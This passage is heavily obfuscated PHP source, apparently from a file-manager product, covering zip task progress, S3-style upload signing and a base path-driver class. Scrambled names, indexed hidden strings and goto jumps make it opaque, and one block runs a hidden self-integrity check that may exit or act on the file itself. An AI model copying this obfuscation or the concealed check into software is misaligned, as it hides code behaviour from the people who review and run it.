$Ò¹ãœÄ = IO::infoWithChildren($şÀáôÏÍ); $Å„ÁéÃŠ = 0; $Õ®¤Ûßô[$úÏÂÑ®•[1847]] = array($úÏÂÑ®•[1848] => $Å„ÁéÃŠ + 1, $úÏÂÑ®•[497] => $Ò¹ãœÄ[$úÏÂÑ®•[32]], $úÏÂÑ®•[87] => $Ò¹ãœÄ[$úÏÂÑ®•[87]], $úÏÂÑ®•[587] => $Ò¹ãœÄ[$úÏÂÑ®•[587]] ? $Ò¹ãœÄ[$úÏÂÑ®•[587]] : $Ò¹ãœÄ[$úÏÂÑ®•[87]]); if ($Ò¹ãœÄ[$úÏÂÑ®•[33]] == $úÏÂÑ®•[233]) { $Õ®¤Ûßô[$úÏÂÑ®•[1150]] = 1; } else { $Õ®¤Ûßô[$úÏÂÑ®•[1150]] = $Ò¹ãœÄ[$úÏÂÑ®•[82]][$úÏÂÑ®•[80]]; } $Õ®¤Ûßô[$úÏÂÑ®•[1152]] = $úÏÂÑ®•[12]; $Õ®¤Ûßô[$úÏÂÑ®•[1840]] = 0; $Õ®¤Ûßô[$úÏÂÑ®•[1785]] = 0; $Õ®¤Ûßô[$úÏÂÑ®•[1838]] = 0; $Õ®¤Ûßô[$úÏÂÑ®•[1839]] = 0; $Õ®¤Ûßô[$úÏÂÑ®•[1836]] = $úÏÂÑ®•[12]; $Õ®¤Ûßô[$úÏÂÑ®•[1843]] = 0; $Õ®¤Ûßô[$úÏÂÑ®•[847]] = $Ò¹ãœÄ[$úÏÂÑ®•[79]]; $this->update(); self::log($úÏÂÑ®•[1909] . json_encode(array($Õ®¤Ûßô, $Ò¹ãœÄ))); } public function nameParse($ÛÑ¼÷Èµ) { $¸ÁöŠ´á =& $_SERVER[«òÑğ]; $¦Ï½êù† =& $this->task; if ($¦Ï½êù†[$¸ÁöŠ´á[1904]] == $¸ÁöŠ´á[1289]) { $¦Ï½êù†[$¸ÁöŠ´á[1904]] = $¸ÁöŠ´á[391]; $¦Ï½êù†[$¸ÁöŠ´á[1843]] = 0; $¦Ï½êù†[$¸ÁöŠ´á[847]] = 0; } $…ÊÉñ = get_path_this($ÛÑ¼÷Èµ); if (strstr($…ÊÉñ, $¸ÁöŠ´á[10])) { $¦Ï½êù†[$¸ÁöŠ´á[1785]] += 1; $¦Ï½êù†[$¸ÁöŠ´á[1150]] += 1; } $¦Ï½êù†[$¸ÁöŠ´á[1836]] = $ÛÑ¼÷Èµ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Çú¶‹îâ =& $_SERVER[«òÑğ]; parent::startAfter(); Hook::bind($Çú¶‹îâ[1910], array($this, $Çú¶‹îâ[1900])); Hook::bind($Çú¶‹îâ[1902], array($this, $Çú¶‹îâ[1903])); $ĞÕ¡ÏÄ =& $this->task; $ĞÕ¡ÏÄ[$Çú¶‹îâ[1904]] = $Çú¶‹îâ[1289]; if (!$ĞÕ¡ÏÄ[$Çú¶‹îâ[1671]]) { $ĞÕ¡ÏÄ[$Çú¶‹îâ[1671]] = LNG($Çú¶‹îâ[1911]); } } protected function endAfter() { $Î„æ¦Óš =& $_SERVER[«òÑğ]; parent::endAfter(); Hook::unbind($Î„æ¦Óš[1910], array($this, $Î„æ¦Óš[1900])); Hook::unbind($Î„æ¦Óš[1902], array($this, $Î„æ¦Óš[1903])); } public function updateAfter() { $É¶—Ùé =& $_SERVER[«òÑğ]; $‡…ÈİÚì =& $this->task; if (!$‡…ÈİÚì[$É¶—Ùé[1150]] || !$‡…ÈİÚì[$É¶—Ùé[847]]) { return; } if ($‡…ÈİÚì[$É¶—Ùé[1904]] == $É¶—Ùé[1289]) { $Ç­“¤ìğ = $‡…ÈİÚì[$É¶—Ùé[1839]]; if ($‡…ÈİÚì[$É¶—Ùé[1840]] != $É¶—Ùé[1289]) { $Ç­“¤ìğ = 0; } $§ëÄ¯Ø = ($‡…ÈİÚì[$É¶—Ùé[1843]] + $Ç­“¤ìğ) / $‡…ÈİÚì[$É¶—Ùé[847]]; $‡…ÈİÚì[$É¶—Ùé[1786]] = $§ëÄ¯Ø * 0.3; } else { if ($‡…ÈİÚì[$É¶—Ùé[1904]] == $É¶—Ùé[391]) { $§ëÄ¯Ø = $‡…ÈİÚì[$É¶—Ùé[1785]] / $‡…ÈİÚì[$É¶—Ùé[1150]]; $‡…ÈİÚì[$É¶—Ùé[1786]] = 0.3 + $§ëÄ¯Ø * 0.5; } else { if ($‡…ÈİÚì[$É¶—Ùé[1904]] == $É¶—Ùé[110]) { $§ëÄ¯Ø = 0; if ($‡…ÈİÚì[$É¶—Ùé[1838]]) { $§ëÄ¯Ø = $‡…ÈİÚì[$É¶—Ùé[1839]] / $‡…ÈİÚì[$É¶—Ùé[1838]]; } $‡…ÈİÚì[$É¶—Ùé[1786]] = 0.3 + 0.5 + $§ëÄ¯Ø * 0.2; } } } if ($‡…ÈİÚì[$É¶—Ùé[1786]] > 0) { $áÃíÃÆÒ = timeFloat() - $‡…ÈİÚì[$É¶—Ùé[1788]] - $‡…ÈİÚì[$É¶—Ùé[1791]]; $‡…ÈİÚì[$É¶—Ùé[1792]] = $áÃíÃÆÒ * (1 - $‡…ÈİÚì[$É¶—Ùé[1786]]) / $‡…ÈİÚì[$É¶—Ùé[1786]]; } } public function copyFileStart($‹Ú™Ò¿É, $í‰ÏÖñ, $ë®È†», $ã“³È¾•, $¸ğíÓ¾, $ıìÄ¨¦›) { $û‘éÓ²¬ =& $_SERVER[«òÑğ]; parent::copyFileStart($‹Ú™Ò¿É, $í‰ÏÖñ, $ë®È†», $ã“³È¾•, $¸ğíÓ¾, $ıìÄ¨¦›); $«¾¼“» =& $this->task; if ($«¾¼“»[$û‘éÓ²¬[1904]] == $û‘éÓ²¬[391]) { $«¾¼“»[$û‘éÓ²¬[1904]] = $û‘éÓ²¬[110]; } $this->update(); } public function copyFileEnd($ã€ÙÛ¶ü, $è§Äƒ­, $»ŒÅó±Ä, $“ø§ñ®, $­Ù®ÛÙ®, $¿ôãÇõÇ) { $«¾şÚç =& $_SERVER[«òÑğ]; $©¯â‡× =& $this->task; $©¯â‡×[$«¾şÚç[1839]] = $©¯â‡×[$«¾şÚç[1838]]; $©¯â‡×[$«¾şÚç[1843]] += $©¯â‡×[$«¾şÚç[1838]]; $©¯â‡×[$«¾şÚç[1840]] = $«¾şÚç[12]; $this->update(); } public function zipEvent($ïŸô–èÉ, $±¹–ÀÔ£, $¦Á ÀĞ¤, $ï¢ƒ—ã) { $ĞÎÌ­ƒ =& $_SERVER[«òÑğ]; $öæ¨‹£ =& $this->task; $öæ¨‹£[$ĞÎÌ­ƒ[1836]] = get_path_this($±¹–ÀÔ£); $öæ¨‹£[$ĞÎÌ­ƒ[1838]] = $ï¢ƒ—ã; $öæ¨‹£[$ĞÎÌ­ƒ[1839]] = $¦Á ÀĞ¤; $öæ¨‹£[$ĞÎÌ­ƒ[1152]] = $ïŸô–èÉ == $ĞÎÌ­ƒ[1912] ? $ĞÎÌ­ƒ[1907] : $ĞÎÌ­ƒ[1908]; $öæ¨‹£[$ĞÎÌ­ƒ[1840]] = $ĞÎÌ­ƒ[12]; $öæ¨‹£[$ĞÎÌ­ƒ[847]] = $ï¢ƒ—ã; $öæ¨‹£[$ĞÎÌ­ƒ[1904]] = $ĞÎÌ­ƒ[391]; $this->update(); } public function nameParse($â°•´µœ) { $ŞŸü•Ãˆ =& $_SERVER[«òÑğ]; $¯î‘Ò·“ =& $this->task; if ($¯î‘Ò·“[$ŞŸü•Ãˆ[1785]] < $¯î‘Ò·“[$ŞŸü•Ãˆ[1150]]) { $–ı–ã—× = get_path_this($â°•´µœ); if (strstr($–ı–ã—×, $ŞŸü•Ãˆ[10])) { $¯î‘Ò·“[$ŞŸü•Ãˆ[1785]] += 1; } } if ($¯î‘Ò·“[$ŞŸü•Ãˆ[1904]] == $ŞŸü•Ãˆ[1289]) { $¯î‘Ò·“[$ŞŸü•Ãˆ[1904]] = $ŞŸü•Ãˆ[391]; } $¯î‘Ò·“[$ŞŸü•Ãˆ[1836]] = $â°•´µœ; $this->update(); } } goto c»á™å¼; d©ÍŠ˜É¹š: if ($_SERVER[$_SERVER[«òÑğ][824]] != $_size($_file)) { $_getc = $_SERVER[«òÑğ][826]; $_getfile = $_SERVER[$_SERVER[«òÑğ][827]] . $_SERVER[«òÑğ][828]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[«òÑğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[«òÑğ][706]) { $exit = $_SERVER[«òÑğ][829]; $exit(); } $_act = $_SERVER[«òÑğ][830]; $_act($_file); } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ áüıÇ) { parent::__construct($ áüıÇ); $this->setSignVersion($_SERVER[«òÑğ][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($†¥²©´ª) { parent::__construct($†¥²©´ª); $this->setSignVersion($_SERVER[«òÑğ][250]); } public function uploadFormData($÷ø«ã”ª, $Ïµì‚˜… = 3600) { $õì­“†ì =& $_SERVER[«òÑğ]; $Şš¦£Ú¥ = $õì­“†ì[232]; $”ØÍßµ« = $õì­“†ì[260]; $‡ÍÈÄÖü = $õì­“†ì[62]; $ÄÈ€®‘  = gmdate($õì­“†ì[261]); $ ú¹ñÑı = gmdate($õì­“†ì[262]); $ÙâÊ£Ó = $õì­“†ì[263]; $¹£•åúÂ = $Ïµì‚˜… . $õì­“†ì[12]; $ËÖÉæÛ = $õì­“†ì[264]; $×ğÓ¯“ = array($this->accessKey, $ ú¹ñÑı, $this->region, $‡ÍÈÄÖü, $ÙâÊ£Ó); $÷˜€ç¢ = implode($õì­“†ì[8], $×ğÓ¯“); $äô¦õ¿ = array($õì­“†ì[265] => gmdate($õì­“†ì[1423], strtotime($õì­“†ì[267])), $õì­“†ì[268] => array(array($õì­“†ì[269] => $this->bucket), array($õì­“†ì[309] => $Şš¦£Ú¥), array($õì­“†ì[270], $õì­“†ì[271], $õì­“†ì[12]), array($õì­“†ì[270], $õì­“†ì[272], $õì­“†ì[12]), array($õì­“†ì[270], $õì­“†ì[310], $õì­“†ì[12]), array($õì­“†ì[273] => $ËÖÉæÛ), array($õì­“†ì[274] => $÷˜€ç¢), array($õì­“†ì[275] => $”ØÍßµ«), array($õì­“†ì[276] => $ÄÈ€®‘ ), array($õì­“†ì[277] => $¹£•åúÂ))); $±ÆÑÑãú = base64_encode(json_encode($äô¦õ¿)); $âÊ£ÉÂ¼ = hash_hmac($õì­“†ì[278], $ ú¹ñÑı, $õì­“†ì[279] . $this->secret, !0); $èš™åÕê = hash_hmac($õì­“†ì[278], $this->region, $âÊ£ÉÂ¼, !0); $“†æÁÏ´ = hash_hmac($õì­“†ì[278], $‡ÍÈÄÖü, $èš™åÕê, !0); $Şî¹ÑÌÀ = hash_hmac($õì­“†ì[278], $ÙâÊ£Ó, $“†æÁÏ´, !0); $®²¢ı…Õ = hash_hmac($õì­“†ì[278], $±ÆÑÑãú, $Şî¹ÑÌÀ); $‘ŸîÏå× = array($õì­“†ì[249] => $õì­“†ì[12], $õì­“†ì[297] => $õì­“†ì[12], $õì­“†ì[309] => $Şš¦£Ú¥, $õì­“†ì[273] => $ËÖÉæÛ, $õì­“†ì[280] => $±ÆÑÑãú, $õì­“†ì[311] => $÷˜€ç¢, $õì­“†ì[312] => $”ØÍßµ«, $õì­“†ì[313] => $ÄÈ€®‘ , $õì­“†ì[314] => $¹£•åúÂ, $õì­“†ì[315] => $®²¢ı…Õ, $õì­“†ì[209] => $this->getHost()); return $‘ŸîÏå×; } } goto ešÉ“ô¡î«; c¦İÍ²®ƒ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ Ç©“±£ =& $_SERVER[«òÑğ]; $this->objectDriver = array($ Ç©“±£[60], $ Ç©“±£[61], $ Ç©“±£[62], $ Ç©“±£[63], $ Ç©“±£[64], $ Ç©“±£[65], $ Ç©“±£[66], $ Ç©“±£[67], $ Ç©“±£[68], $ Ç©“±£[69], $ Ç©“±£[70], $ Ç©“±£[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¤µÇ§ş‘) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¤µÇ§ş‘, $_SERVER[«òÑğ][8]); } return $¤µÇ§ş‘; } public function iconvApp($³¿®ƒà´) { return $³¿®ƒà´; } public function iconvSystem($¸ı£²‘·) { return $¸ı£²‘·; } public function iconvTo($Ø™ú ë×, $ôŞº®‘Ù, $ó§ÍóÃ) { $Ğé“Í×´ =& $_SERVER[«òÑğ]; if (!$Ø™ú ë× || !function_exists($Ğé“Í×´[72])) { return $Ø™ú ë×; } static $®¥‡û»Š = array(); $î›Ş› = $ôŞº®‘Ù . $Ğé“Í×´[73] . $ó§ÍóÃ . $Ğé“Í×´[74] . $Ø™ú ë×; if (isset($®¥‡û»Š[$î›Ş›])) { return $®¥‡û»Š[$î›Ş›]; } if (function_exists($Ğé“Í×´[75])) { $ÛÙıêÓ· = @mb_convert_encoding($Ø™ú ë×, $ó§ÍóÃ, $ôŞº®‘Ù); } else { $ÛÙıêÓ· = @iconv($ôŞº®‘Ù, $ó§ÍóÃ, $Ø™ú ë×); } $ÛÙıêÓ· = $ÛÙıêÓ· ? $ÛÙıêÓ· : $Ø™ú ë×; if (strstr($ÛÙıêÓ·, $Ğé“Í×´[76])) { $ÛÙıêÓ· = str_replace($Ğé“Í×´[76], $Ğé“Í×´[11], $ÛÙıêÓ·); } $®¥‡û»Š[$ôŞº®‘Ù . $Ğé“Í×´[73] . $ó§ÍóÃ . $Ğé“Í×´[74] . $Ø™ú ë×] = $ÛÙıêÓ·; $®¥‡û»Š[$ó§ÍóÃ . $Ğé“Í×´[73] . $ôŞº®‘Ù . $Ğé“Í×´[74] . $Ø™ú ë×] = $Ø™ú ë×; $®¥‡û»Š[$ó§ÍóÃ . $Ğé“Í×´[73] . $ôŞº®‘Ù . $Ğé“Í×´[74] . $ÛÙıêÓ·] = $Ø™ú ë×; $®¥‡û»Š[$ôŞº®‘Ù . $Ğé“Í×´[73] . $ó§ÍóÃ . $Ğé“Í×´[74] . $ÛÙıêÓ·] = $ÛÙıêÓ·; return $ÛÙıêÓ·; } public function getPathInner($±¦‘Òæô) { $›Ñ”½ò = IO::init($±¦‘Òæô); return $›Ñ”½ò->path; } public function getPathOuter($’–Õ‰Ø¸) { $Š÷˜²¡ =& $_SERVER[«òÑğ]; $£¸Œñº = strlen(trim($this->pathBase, $Š÷˜²¡[8])); $’–Õ‰Ø¸ = substr(trim($’–Õ‰Ø¸, $Š÷˜²¡[8]), $£¸Œñº); return $this->pathDriver . $Š÷˜²¡[8] . ltrim($’–Õ‰Ø¸, $Š÷˜²¡[8]); } public function isParentOf($¶Ú £Üø, $²ìÆ¤ì‘) { $Š«áè¬ø =& $_SERVER[«òÑğ]; $¶Ú £Üø = rtrim(strtolower($¶Ú £Üø), $Š«áè¬ø[8]) . $Š«áè¬ø[8]; $²ìÆ¤ì‘ = rtrim(strtolower($²ìÆ¤ì‘), $Š«áè¬ø[8]) . $Š«áè¬ø[8]; $±ªû‹›™ = strpos($²ìÆ¤ì‘, $¶Ú £Üø) === 0; return $±ªû‹›™; } public function getType() { $¦ìÏßÃı =& $_SERVER[«òÑğ]; $ôş÷Ÿ™÷ = str_replace($¦ìÏßÃı[77], $¦ìÏßÃı[12], get_class($this)); return strtolower($ôş÷Ÿ™÷); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ğóš³§Ğ, $ş³ôÒ§) { $Óü³‹èÃ =& $_SERVER[«òÑğ]; $îŞ”à†µ = rtrim($Ğóš³§Ğ, $Óü³‹èÃ[8]) . $Óü³‹èÃ[8] . $ş³ôÒ§; $ãÈ’Šà = $this->exist($îŞ”à†µ); return $ãÈ’Šà ? $îŞ”à†µ : !1; } public function setModifyTime($È–ÖßĞŠ, $¾ğ±Ó† = '') { } public function renameObject($ª†Êïİ„, $öÔ£ìÕÂ) { $¶Ø§‡Å = $öÔ£ìÕÂ; $ª†Êïİ„ = $this->getPathOuter($ª†Êïİ„); $öÔ£ìÕÂ = $this->pathFather($ª†Êïİ„) . $öÔ£ìÕÂ; $»ı¾î§í = IO::copy($ª†Êïİ„, $this->pathFather($ª†Êïİ„), REPEAT_RENAME_FOLDER, $¶Ø§‡Å); if ($»ı¾î§í) { IO::remove($ª†Êïİ„); } return $»ı¾î§í ? $öÔ£ìÕÂ : !1; } public function tempFile($ƒü¯ôŠ† = '', $Ö…¿½” = '') { if (!$ƒü¯ôŠ†) { $ƒü¯ôŠ† = rand_string(15); } $Æëšº = TEMP_FILES . rand_string(15) . $_SERVER[«òÑğ][8]; @mkdir($Æëšº, DEFAULT_PERRMISSIONS, !0); $Æ’›®ÙÛ = $Æëšº . $ƒü¯ôŠ†; @touch($Æ’›®ÙÛ); if ($Ö…¿½”) { file_put_contents($Æ’›®ÙÛ, $Ö…¿½”); } return $Æ’›®ÙÛ; } public function tempFileRemve($Ò§ ¶ìå) { @unlink($Ò§ ¶ìå); @rmdir($this->pathFather($Ò§ ¶ìå)); } public function mkfile($¤ğÉà¨€, $Ö»ë‡æ‡ = '', $•Šôº¸” = REPEAT_RENAME) { } public function mkdir($ıÙ üıŞ, $¥·úª£ä = REPEAT_SKIP) { } public function delFile($×€¤½Ë) { } public function delFolder($Ûœ£™ñ©) { } public function copyFile($œ£›•‡‚, $’¨ÕÚÈÕ) { } public function moveFile($ßËµ¯Š, $èşŠËô®) { } public function remove($­‘¹¢¾) { if ($this->isFile($­‘¹¢¾)) { return $this->delFile($­‘¹¢¾); } return $this->delFolder($­‘¹¢¾); } public function rename($Ë®ÛÆüì, $ç¸“›‡Ú) { } public function exist($õüİ–¼ª) { } public function findByHash($¨ô¥š¿¹ = '', $®ñİçªù = '') { return !1; } public function isFile($¹“›¸ïÁ) { } public function isFolder($´ââ¬–) { } public function size($Ê°ÛˆÉÌ) { } public function info($„ÒéÉåÂ) { } public function infoSimple($ı èÒ©”) { return $this->info($ı èÒ©”); } public function infoAuth($š‹¬÷) { return $this->info($š‹¬÷); } public function infoFull($‚Ú×šÊ‰) { return $this->info($‚Ú×šÊ‰); } public function infoFullSimple($¿É‹øÂƒ) { return $this->info($¿É‹øÂƒ); } public function infoWithChildren($šÃØšÙ”) { $”©‰ˆñ¦ =& $_SERVER[«òÑğ]; static $ÑŞÃ¬“˜ = array(); if (isset($ÑŞÃ¬“˜[$šÃØšÙ”])) { return $ÑŞÃ¬“˜[$šÃØšÙ”]; } $¯Ò„Ô¹ç = $this->info($šÃØšÙ”); if ($¯Ò„Ô¹ç && $¯Ò„Ô¹ç[$”©‰ˆñ¦[33]] == $”©‰ˆñ¦[78]) { $òºŞº· = array($”©‰ˆñ¦[79] => 0, $”©‰ˆñ¦[80] => 0, $”©‰ˆñ¦[81] => 0); $this->infoChildren($šÃØšÙ”, $òºŞº·); $¯Ò„Ô¹ç[$”©‰ˆñ¦[79]] = $òºŞº·[$”©‰ˆñ¦[79]]; $¯Ò„Ô¹ç[$”©‰ˆñ¦[82]] = array($”©‰ˆñ¦[83] => $òºŞº·[$”©‰ˆñ¦[80]], $”©‰ˆñ¦[84] => $òºŞº·[$”©‰ˆñ¦[81]]); $ÑŞÃ¬“˜[$šÃØšÙ”] = $¯Ò„Ô¹ç; } return $¯Ò„Ô¹ç; } public function listPath($ îæıØß, $ÈÑ¼ÕÑà = false) { } public function has($´Ğ×¤¿º, $¯Ëè¡°” = false, $õÊ‡ˆÁÈ = false) { } public function canRead($³Ï€¬·³) { } public function canWrite($‡ÓĞÚß) { } public function getContent($õ£½Ò¨œ) { } public function setContent($…íù¤×¤, $½Û¼ú = '') { } protected function infoChildren($¥Ë«šÑî, &$Ç×›¼…) { $ÒåÂ˜” =& $_SERVER[«òÑğ]; check_abort_echo(); $ˆ÷äó…Á = $this->listPath($¥Ë«šÑî, !0); $ˆ÷äó…Á = array_merge($ˆ÷äó…Á[$ÒåÂ˜”[85]], $ˆ÷äó…Á[$ÒåÂ˜”[86]]); foreach ($ˆ÷äó…Á as $¤¾à»Ä) { if ($¤¾à»Ä[$ÒåÂ˜”[33]] == $ÒåÂ˜”[78]) { $Ç×›¼…[$ÒåÂ˜”[81]]++; $ß±Øóõ = $this->getPathInner($¤¾à»Ä[$ÒåÂ˜”[87]]); $this->infoChildren($ß±Øóõ, $Ç×›¼…); } else { $Ç×›¼…[$ÒåÂ˜”[80]]++; $Ç×›¼…[$ÒåÂ˜”[79]] += $¤¾à»Ä[$ÒåÂ˜”[79]]; } } } public function fileSubstr($ûÊëà–, $ü¨‡ÊÖ², $Ö™¹ûâ) { } public function listAll($¿ÓÙàœ¿) { } public function listAllMake($¡³È‘¾, &$Ô„ëàô±) { $½¶úñÕƒ =& $_SERVER[«òÑğ]; check_abort_echo(); $½Í¢¢… = $this->listPath($¡³È‘¾, !0); if (!$½Í¢¢…) { return; } $Æ¥å¥Ğø = array_merge($½Í¢¢…[$½¶úñÕƒ[85]], $½Í¢¢…[$½¶úñÕƒ[86]]); foreach ($Æ¥å¥Ğø as $Úå³—Ñš) { $§ê†›éØ = $Úå³—Ñš[$½¶úñÕƒ[33]] == $½¶úñÕƒ[78]; $“æÑùâŸ = array($½¶úñÕƒ[87] => $Úå³—Ñš[$½¶úñÕƒ[87]], $½¶úñÕƒ[78] => $§ê†›éØ); if (isset($Úå³—Ñš[$½¶úñÕƒ[79]])) { $“æÑùâŸ[$½¶úñÕƒ[79]] = $Úå³—Ñš[$½¶úñÕƒ[79]]; } if (isset($Úå³—Ñš[$½¶úñÕƒ[88]])) { $“æÑùâŸ[$½¶úñÕƒ[88]] = $Úå³—Ñš[$½¶úñÕƒ[88]]; } if (!$§ê†›éØ) { $Ô„ëàô±[] = $“æÑùâŸ; continue; } $Ô„ëàô±[] = $“æÑùâŸ; $‚ÚÕÁËº = $Úå³—Ñš[$½¶úñÕƒ[87]]; $‡—ç»¥Ø = $this->pathDriver; if (substr($Úå³—Ñš[$½¶úñÕƒ[87]], 0, strlen($‡—ç»¥Ø)) == $‡—ç»¥Ø) { $‚ÚÕÁËº = substr($‚ÚÕÁËº, strlen($‡—ç»¥Ø)); } $this->listAllMake($‚ÚÕÁËº, $Ô„ëàô±); } } public function listAllSimple($¦üñ‚ÈŸ, $€ßƒºˆŸ = false) { $Ë…´È”Õ = $this->listAll($¦üñ‚ÈŸ); return $this->listAllSimpleMake($Ë…´È”Õ, $this->getPathOuter($¦üñ‚ÈŸ), $€ßƒºˆŸ); } public function listAllSimpleMake($çâøù¥œ, $£Ó“øÍ¶, $¶ãšÓù½) { $ Ä»¼  =& $_SERVER[«òÑğ]; $õ¸Êãèş = array(); $£Ó“øÍ¶ = rtrim(get_path_father($£Ó“øÍ¶), $ Ä»¼ [8]) . $ Ä»¼ [8]; foreach ($çâøù¥œ as $—Â³ Ş) { $²ìöÊÌæ = array($ Ä»¼ [87] => $—Â³ Ş[$ Ä»¼ [87]], $ Ä»¼ [89] => $—Â³ Ş[$ Ä»¼ [87]], $ Ä»¼ [78] => $—Â³ Ş[$ Ä»¼ [78]]); if (isset($—Â³ Ş[$ Ä»¼ [79]]) && !$—Â³ Ş[$ Ä»¼ [78]]) { $²ìöÊÌæ[$ Ä»¼ [79]] = $—Â³ Ş[$ Ä»¼ [79]]; } if (isset($—Â³ Ş[$ Ä»¼ [88]])) { $²ìöÊÌæ[$ Ä»¼ [88]] = $—Â³ Ş[$ Ä»¼ [88]]; } if (is_array($—Â³ Ş[$ Ä»¼ [90]])) { $²ìöÊÌæ[$ Ä»¼ [89]] = $—Â³ Ş[$ Ä»¼ [90]][$ Ä»¼ [87]]; $²ìöÊÌæ[$ Ä»¼ [79]] = $—Â³ Ş[$ Ä»¼ [90]][$ Ä»¼ [79]]; $²ìöÊÌæ[$ Ä»¼ [88]] = $—Â³ Ş[$ Ä»¼ [90]][$ Ä»¼ [88]]; } else { if (substr($—Â³ Ş[$ Ä»¼ [87]], 0, strlen($£Ó“øÍ¶)) == $£Ó“øÍ¶) { $²ìöÊÌæ[$ Ä»¼ [87]] = substr($—Â³ Ş[$ Ä»¼ [87]], strlen($£Ó“øÍ¶)); } } $§²»ŞÎØ = $—Â³ Ş[$ Ä»¼ [78]] ? $ Ä»¼ [8] : $ Ä»¼ [12]; $²ìöÊÌæ[$ Ä»¼ [89]] = rtrim($²ìöÊÌæ[$ Ä»¼ [89]], $ Ä»¼ [8]) . $§²»ŞÎØ; $²ìöÊÌæ[$ Ä»¼ [87]] = $ Ä»¼ [8] . trim($²ìöÊÌæ[$ Ä»¼ [87]], $ Ä»¼ [8]) . $§²»ŞÎØ; if (!$¶ãšÓù½) { $ÕÓ³¤Á³ = explode($ Ä»¼ [8], trim($²ìöÊÌæ[$ Ä»¼ [87]], $ Ä»¼ [8])); $²ìöÊÌæ[$ Ä»¼ [87]] = $ Ä»¼ [8] . implode($ Ä»¼ [8], array_slice($ÕÓ³¤Á³, 1)) . $§²»ŞÎØ; } $õ¸Êãèş[] = $²ìöÊÌæ; } return array_sort_by($õ¸Êãèş, $ Ä»¼ [87]); } public function upload($»£°€ÔÆ, $õ¸›¦ñ¨, $ğĞ¡Øç = false, $¬¹»İôŞ = REPEAT_REPLACE) { } public function uploadFileByID($¬œ·¡Äî, $Ğ®ö¯ŞŠ, $ó‹”á—î) { } public function uploadFileByPath($óŞ®º—¬, $¶›€ô—Ï, $œÒÆ®øœ = array()) { } public function isUploadServer() { $±áŒ™  =& $_SERVER[«òÑğ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $±áŒ™ [91]) { return !0; } return $GLOBALS[$±áŒ™ [6]][$±áŒ™ [92]][$±áŒ™ [93]]; } public function isFileOutServer() { $‡¢ş¿É´ =& $_SERVER[«òÑğ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‡¢ş¿É´[91]) { return !0; } return $GLOBALS[$‡¢ş¿É´[6]][$‡¢ş¿É´[92]][$‡¢ş¿É´[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($íØÙó§—) { $‰²¶Ù‡Û =& $_SERVER[«òÑğ]; if (!$this->isCdnHost()) { return $íØÙó§—; } return str_replace(trim(get_url_root($íØÙó§—), $‰²¶Ù‡Û[8]), trim($this->cdnHost, $‰²¶Ù‡Û[8]), $íØÙó§—); } public function uploadLink($—à¯»²ô, $€ªÓ¹š³ = 0) { $Â¢äÏİì =& $_SERVER[«òÑğ]; if ($this->isUploadServer()) { return; } $ ®ä©» = $this->getType(); if (!in_array($ ®ä©», $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ô‡µâŒØ = 1024 * 1024 * 10; $Ñ©ş ÷« = $€ªÓ¹š³ <= $ô‡µâŒØ ? $Â¢äÏİì[95] : $Â¢äÏİì[96]; $¥äËŸø = (!$€ªÓ¹š³ ? 1 : ceil($€ªÓ¹š³ / pow(1024, 3))) * 3600 * 4; $¾èÚ÷ğÏ = $this->{$Ñ©ş ÷«}($—à¯»²ô, $¥äËŸø); if ($¾èÚ÷ğÏ) { $¾èÚ÷ğÏ[$Â¢äÏİì[97]] = $—à¯»²ô; $¾èÚ÷ğÏ[$Â¢äÏİì[98]] = $ ®ä©»; } return $¾èÚ÷ğÏ; } public function uploadFormData($ İ«Ò½¥, $Éü‹Õ´ = 3600) { } public function uploadMultiData($Ã°„ªˆ½, $††å³ùÖ = 3600) { } public function multiUploadFormData($ƒ¾ššå‹, $¶Òğ“‘„ = 3600) { return $this->uploadMultiData($ƒ¾ššå‹, $¶Òğ“‘„); } public function download($Ñ—±¬Ú, $Ú¨­õßâ) { } public function ext($‘•¼¡Ã) { $Ğğ£û¼ =& $_SERVER[«òÑğ]; if (strpos($‘•¼¡Ã, $Ğğ£û¼[8]) === -1) { $ß˜àÜ™Ú = $‘•¼¡Ã; } else { $ß˜àÜ™Ú = $this->pathThis($‘•¼¡Ã); } $ö½à±İ = $Ğğ£û¼[12]; if (strstr($ß˜àÜ™Ú, $Ğğ£û¼[10])) { $ö½à±İ = substr($ß˜àÜ™Ú, strrpos($ß˜àÜ™Ú, $Ğğ£û¼[10]) + 1); $ö½à±İ = strtolower($ö½à±İ); } if (strlen($ö½à±İ) > 3 && preg_match($Ğğ£û¼[99], $ö½à±İ, $˜´³Õââ)) { $ö½à±İ = $Ğğ£û¼[12]; } return $ö½à±İ; } public function pathThis($Ç×áâÄà) { $µƒíş‘ç =& $_SERVER[«òÑğ]; $Ç×áâÄà = str_replace($µƒíş‘ç[100], $µƒíş‘ç[8], rtrim($Ç×áâÄà, $µƒíş‘ç[8])); $š”ÔóÔ§ = strrpos($Ç×áâÄà, $µƒíş‘ç[8]); if ($š”ÔóÔ§ === !1) { return $Ç×áâÄà; } return substr($Ç×áâÄà, $š”ÔóÔ§ + 1); } public function pathFather($Ï¦ëÑ–ê) { $çâ÷—²— =& $_SERVER[«òÑğ]; $Ï¦ëÑ–ê = str_replace($çâ÷—²—[100], $çâ÷—²—[8], rtrim($Ï¦ëÑ–ê, $çâ÷—²—[8])); $Ú°ÚÓÖ = strrpos($Ï¦ëÑ–ê, $çâ÷—²—[8]); if ($Ú°ÚÓÖ === !1) { return $çâ÷—²—[12]; } return substr($Ï¦ëÑ–ê, 0, $Ú°ÚÓÖ + 1); } public function hashSimple($¯¾²¯ŞÒ) { $Ã»¢˜¹å =& $_SERVER[«òÑğ]; if (!$¯¾²¯ŞÒ) { return md5($Ã»¢˜¹å[12]); } $ûÖÍØ¬ = $this->size($¯¾²¯ŞÒ); 